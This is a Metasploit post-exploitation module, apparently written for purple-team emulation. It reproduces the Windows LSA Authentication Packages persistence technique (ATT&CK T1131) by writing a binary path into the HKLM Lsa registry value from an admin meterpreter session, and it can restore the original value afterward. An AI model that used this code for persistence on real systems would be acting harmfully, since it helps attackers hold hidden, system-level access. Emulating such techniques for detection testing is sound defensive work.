##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  # BASE_KEY="HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\"


  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Authentication Package (T1131) Windows - Purple Team',
        'Description'   => %q{
          Persistence:
          Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. [1]
          Adversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ with the key value of "Authentication Packages"=. The binary will then be executed by the system when the authentication packages are loaded.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1131' ] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptBool.new("CLEANUP", [true, "Remove registry key after execution", true])
      ])
  end


  # TODO, upload binaries and get them to run instead of just changing the registry
  def run
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"
      raise "Requires admin" unless is_admin?

      t1131_execute("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\", "Authentication Packages", "msv1_0, C:\\t1131.exe", "msv1_0")

      print_good("Module T1131W execution succesful.")
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1131W execution failed.")
    end
  end

  def t1131_execute(base_key, reg_key, val, old_val)
    reg_modify(base_key, reg_key, val)
    print_good("set #{base_key}#{reg_key} to \"#{registry_getvaldata(base_key, reg_key)}\"")
    if datastore['CLEANUP']
      print_warning("Cleaning up. This will remove the registry change")
      reg_modify(base_key, reg_key, old_val)
    end
  end

  def reg_modify(base_key, reg_name, value)
    registry_setvaldata(base_key, reg_name, value, "REG_SZ")
  end
end
